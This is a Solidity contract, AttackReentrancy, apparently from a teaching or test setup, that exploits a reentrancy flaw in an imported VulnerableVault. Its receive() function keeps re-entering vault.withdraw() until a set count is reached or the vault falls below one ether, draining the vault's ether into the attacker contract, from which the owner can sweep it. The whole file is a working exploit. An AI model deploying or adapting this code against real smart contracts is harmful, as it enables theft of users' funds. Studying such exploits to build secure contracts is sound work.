// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./VulnerableVault.sol";

/**
 * @title AttackReentrancy
 * @notice Exploits the reentrancy vulnerability in VulnerableVault
 */
contract AttackReentrancy {
    VulnerableVault public vault;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;
    uint256 public profit;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
        owner = msg.sender;
    }

    // Step 1: Deposit to get a balance
    function deposit() external payable {
        require(msg.value > 0);
        vault.deposit{value: msg.value}();
    }

    // Step 2: Initiate attack
    function attack(uint256 _maxAttacks) external {
        maxAttacks = _maxAttacks;
        attackCount = 0;
        vault.withdraw();
        // Calculate profit
        profit = address(this).balance;
    }

    // Step 3: This is called when vault sends ETH
    // Re-enters vault.withdraw() before state is updated
    receive() external payable {
        attackCount++;
        // Keep re-entering while vault has funds and we haven't hit max
        if (attackCount < maxAttacks && address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
        // Don't send to owner — keep profit in contract for verification
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}
